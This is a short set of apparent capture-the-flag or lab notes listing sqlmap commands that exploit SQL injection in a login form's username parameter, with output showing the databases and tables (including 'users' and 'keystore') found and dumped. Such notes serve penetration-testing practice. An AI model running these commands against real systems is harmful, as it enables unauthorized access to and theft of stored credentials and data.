http://94.237.58.6:35591

sqlmap -r http-login.post -p username -o --dump-all

databases:

    cybercore
    information_schema
    test

sqlmap -r http-login.post -p username -o -D cybercore --tables

database 'cybercore' tables:

    keystore
    users

sqlmap -r http-login.post -p username -o -D cybercore --dump-all

